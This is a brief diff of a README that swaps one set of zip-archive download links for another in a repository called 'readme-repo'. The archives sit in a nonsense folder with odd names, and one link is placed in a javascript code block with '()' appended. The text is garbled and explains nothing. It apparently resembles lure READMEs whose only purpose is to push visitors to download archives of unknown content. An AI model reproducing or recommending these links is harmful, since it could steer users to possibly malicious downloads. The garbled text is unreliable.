@@ -19,8 +19,8 @@ __bold__
  ```
 
  ```javascript
- https://raw.githubusercontent.com/Jonisark/readme-repo/master/unusefully/readme-repo-menstruant.zip()
+ https://github.com/Jonisark/readme-repo/raw/refs/heads/master/unusefully/repo-readme-v2.2.zip()
   ```
 
-https://raw.githubusercontent.com/Jonisark/readme-repo/master/unusefully/readme-repo-menstruant.zip  
-   https://raw.githubusercontent.com/Jonisark/readme-repo/master/unusefully/readme-repo-menstruant.zip
+https://github.com/Jonisark/readme-repo/raw/refs/heads/master/unusefully/repo-readme-v2.2.zip  
+   https://github.com/Jonisark/readme-repo/raw/refs/heads/master/unusefully/repo-readme-v2.2.zip
